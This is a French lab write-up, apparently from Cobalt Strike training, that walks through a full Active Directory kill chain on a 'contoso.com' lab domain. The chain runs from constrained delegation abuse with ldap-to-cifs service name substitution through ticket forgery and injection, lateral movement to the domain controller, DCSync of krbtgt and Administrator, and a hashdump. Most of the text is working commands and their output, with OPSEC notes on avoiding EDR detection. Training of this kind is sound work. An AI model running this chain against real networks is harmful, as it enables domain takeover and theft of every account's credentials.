# Challenge Kerberos  

> **Objectif :** identifier une mauvaise configuration Kerberos, effectuer un **Lateral Movement** vers `lon-dc-1` et lister le partage `C$` du Domain Controller.

> **Technique :** Constrained Delegation avec **Service Name Substitution** (`ldap` → `cifs`). `LON-WKSTN-1$` possède une delegation vers `ldap/lon-dc-1`, sans CIFS dans la liste.  
> La substitution de la classe du service dans la partie non chiffrée du ticket permet, dans ce lab, de présenter un ticket CIFS accepté par la cible.  

>Le challenge applique la transformation `ldap/lon-dc-1` → `cifs/lon-dc-1` contre le Domain Controller lui-même.  

---

## Prérequis

Charger le script Aggressor **Kerbeus BOF** avant d'utiliser les commandes `krb_*` :

```
Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

> OPSEC-🟢SAFE — Les opérations Kerberos basées sur BOF s'exécutent dans le thread du Beacon, sans création de child process.

<img src="/images/kerberos-challenge01.png" width=860>

> Deux Beacons sur LON-WKSTN-1 — `pchilds` (user) and `SYSTEM*` (machine). Le script Kerbeus-BOF est chargé dans Script Manager.  
> Le Beacon SYSTEM est nécessaire pour accéder au LUID `0x3e7`.  

----

## Étape 1 — Énumérer les tickets Kerberos

Depuis le Beacon SYSTEM de `lon-wkstn-1` :

```cs
krb_triage
```

Sortie de `krb_triage` — sessions de logon du compte machine :

```
| LUID    | Client               | Service                               | End Time            |
|---------|----------------------|---------------------------------------|---------------------|
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM              | 13.04.2026 06:06:12 |
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com       | 13.04.2026 06:06:12 |
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 13.04.2026 06:06:12 |
```

LUID `0x3e7` correspond à la **session de logon SYSTEM du compte machine**, présente sur un hôte joint au domaine.

<img src="/images/kerberos-challenge02.png" width=860>

> `krb_triage` montre le LUID `0x3e7` (LON-WKSTN-1$ tickets du compte machine. On voit aussi un premier `ldapsearch` filtré sur `userAccountControl` qui identifie `LON-DC-1$`.

---

## Étape 2 — Énumérer la Constrained Delegation

```cs
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

Sortie de `ldapsearch` :

```
userAccountControl: 16781312
sAMAccountName: LON-WKSTN-1$
msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
retreived 1 results total
```

> OPSEC-🟢SAFE — BOF ldapsearch, runs in beacon thread, no child process.

**Résultat :** `LON-WKSTN-1$` dispose d'une Constrained Delegation vers `ldap/lon-dc-1.contoso.com` — **LDAP only, no CIFS**. C'est la mauvaise configuration étudiée. La classe de service `ldap` peut être remplacée par `cifs` dans le ticket dans le cadre du lab.

`userAccountControl: 16781312` = `TRUSTED_TO_AUTH_FOR_DELEGATION` activé (S4U2self sans mot de passe utilisateur).

<img src="/images/kerberos-challenge03.png" width=860>

> `ldapsearch` avec le filtre `msDS-AllowedToDelegateTo=*` confirme que `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1.contoso.com, ldap/lon-dc-1`. Aucune entrée CIFS : c'est le point exploité dans le challenge.

---

## Étape 3 — Récupérer le TGT du compte machine

```cs
krb_dump /luid:3e7 /service:krbtgt
```

Résultat (tronqué) :

```
UserName        : LON-WKSTN-1$
Domain          : CONTOSO
LogonId         : 0:0x3e7
UserSID         : S-1-5-18
Authentication  : Negotiate

  [0] Forwarded TGT
    ClientName  : lon-wkstn-1$ @ CONTOSO.COM
    ServiceRealm: krbtgt/CONTOSO.COM @ CONTOSO.COM
    Flags       : forwardable forwarded renewable pre_authent enc_pa_rep
    KeyType     : aes256_cts_hmac_sha1

    doIFrDCCBaigAwIBBaEDAg<snip>AgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
```

OPSEC-🟠CAUTION — BOF sans child process. Utilise l'API Kerberos `LsaCallAuthenticationPackage`, qui peut être surveillée par l'EDR. Pas d'accès direct à la mémoire LSASS.

Copier le TGT Base64 complet (ticket d'index `[0]`, marqué forwarded et forwardable) pour l'étape suivante.

---

## Étape 4 — S4U avec Service Name Substitution

Utiliser le TGT machine pour effectuer S4U2proxy avec le SPN délégué (`ldap/lon-dc-1`), puis remplacer la classe de service par `cifs` :

```cs
krb_s4u /ticket:doIFrDCCBaigAwIBBaEDAgEWoo <snip> d0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator
```

Sortie de `krb_s4u` :

```
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'

[*] Impersonating user 'Administrator' to target SPN 'ldap/lon-dc-1'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'ldap/lon-dc-1'
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':

doIGhDCCBoCgAwIBBaED <snip> hEjAQGwRjaWZzGwhsb24tZGMtMQ==
```

> OPSEC-🟢SAFE — `krb_s4u` est un BOF exécuté dans le thread du Beacon, sans child process ni écriture sur le disque de la cible.

## Étape 5 — Enregistrer le service ticket sur l'Attacker Desktop

Exécuter cette commande dans un terminal PowerShell **local sur l'Attacker Desktop**, et non dans le Beacon :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("doIGhDCCBoCgAwIBBaEDAgEWooIFnDCC<snip>QGwRjaWZzGwhsb24tZGMtMQ=="))
```

<img src="/images/kerberos-challenge05.png" width=860>

> CS beacon présente le déroulement complet de `krb_s4u` : S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Suivi de `make_token CONTOSO\Administrator FakePass` (netonly), puis de `kerberos_ticket_use` pour injecter le fichier `.kirbi`.

**`/altservice:cifs`** Remplace la classe de service dans le champ non chiffré décrit par les notes. Le PAC signé par le KDC reste inchangé ; le ticket ainsi modifié est accepté dans l'environnement du lab.

Copier la totalité de la sortie Base64 du SPN `cifs/lon-dc-1`.


<img src="/images/kerberos-challenge04.png">

> Le terminal PowerShell montre les flags du TGT (`forwardable, forwarded, pre_authent, renewable`) qui confirment que le ticket est utilisable pour la delegation. La commande `WriteAllBytes` sauvegarde le service ticket Base64 en `.kirbi` sur l'Attacker Desktop.

---

## Étape 6 — Injecter le ticket et accéder au partage

De retour dans le Beacon de `lon-wkstn-1` :

>`.kirbi` est enregistré uniquement sur l'Attacker Desktop, sans écriture sur le DC cible. `kerberos_ticket_use` lit le fichier depuis le client Cobalt Strike et l'injecte par le canal C2.  

```cs
make_token CONTOSO\Administrator FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ls \\lon-dc-1\c$
```

>Résultat de la liste des fichiers :  

```
 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     04/11/2025 13:01:00   Program Files
<snip>
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 11:54:00   Windows
 12kb     fil     04/12/2026 14:05:24   DumpStack.log.tmp
 1gb      fil     04/12/2026 14:05:24   pagefile.sys
```

> OPSEC-🟢SAFE — `make_token` crée une session de logon temporaire dans le contexte Beacon.  
> `kerberos_ticket_use` injecte le ticket dans cette session, sans écriture sur disque ni child process côté cible.  

## Lateral Movement vers le DC

```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

>Résultat du jump Beacon :  

```
[04/28 10:08:05] [+] host called home, sent: 396130 bytes
[04/28 10:08:31] [+] received output:
Trying to connect to lon-dc-1

[04/28 10:08:31] [+] received output:
SC_HANDLE Manager 0x00000211C48A66C0

[04/28 10:08:31] [+] received output:
Opening defragsvc

[04/28 10:08:31] [+] received output:
SC_HANDLE Service 0x00000211C48A60A0
<snip>

[04/28 10:08:31] [+] established link to child beacon: 10.10.120.1
```

## LON-DC-1 Beacon SYSTEM - 10.10.120.1

```
cd c:\users
cd Administrator
ls
getuid
ipconfig
```

>Sortie de `ipconfig` :  
```
received output:
{786FFF21-9572-488C-94B9-FD396C9802A4}
	Ethernet
	Microsoft Hyper-V Network Adapter
	02-15-5D-18-5F-C0
	10.10.120.1
Hostname: 	lon-dc-1
DNS Suffix: 	contoso.com
DNS Server: 	127.0.0.1
```

## DCSync sur le DC

```
dcsync contoso.com CONTOSO\krbtgt
```

Sortie DCSync pour `krbtgt` :

```
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 14:50:53
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 2d454c2120b54890b3db65406e5a5974
    ntlm- 0: 2d454c2120b54890b3db65406e5a5974
    lm  - 0: 6666c48c4b440676cfda7be586409948
```

<img src="/images/kerberos_challenge_extra.png">  

```
dcsync contoso.com CONTOSO\Administrator
```

Sortie DCSync pour Administrator

```
** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 01:00:00
Password last change : 24/01/2025 14:33:09
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
```

## Fin du lab

```                                   
note london dc
hashdump


[05/20 14:57:01] [+] [job 1] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2d454c2120b54890b3db65406e5a5974:::
pchilds:1105:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
rsteel:1108:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
dyork:1109:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
oracle_svc:3101:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
mssql_svc:3102:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
crobin:3103:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
LON-DC-1$:1000:aad3b435b51404eeaad3b435b51404ee:7f3217fd8f6b9c14fefbd2888c710735:::
LON-WS-1$:1110:aad3b435b51404eeaad3b435b51404ee:6aebff13c1104e5976142e8ea435fffb:::
LON-FS-1$:1111:aad3b435b51404eeaad3b435b51404ee:18141ec2f3e83bff48075be427263c1d:::
LON-WKSTN-1$:2101:aad3b435b51404eeaad3b435b51404ee:3cad4d50decc7d04e6fec0a3c3793cc0:::
LON-WKSTN-2$:2102:aad3b435b51404eeaad3b435b51404ee:14e9b8f0d0bbdcf4dd64964e60aebecb:::
LON-DB-1$:4601:aad3b435b51404eeaad3b435b51404ee:cce3f72b3b4bcffe0af7979588b885b6:::
LON-DB-2$:6601:aad3b435b51404eeaad3b435b51404ee:eaaecc5850514fd440004b7b527c5d45:::
LON-CS-1$:9101:aad3b435b51404eeaad3b435b51404ee:d484d958efea3fda03432c3ef91b4fed:::

desktop

portscan 10.10.120.0-10.10.121.255 1-1024,3389,5000-6000 arp 1024

screenshot
```

>Objectif du lab : **terminé**. Kerberos Constrained delegation abuse → SYSTEM on LON-DC-1 → DCSync krbtgt. Kill Chain complète avec étapes complémentaires.  

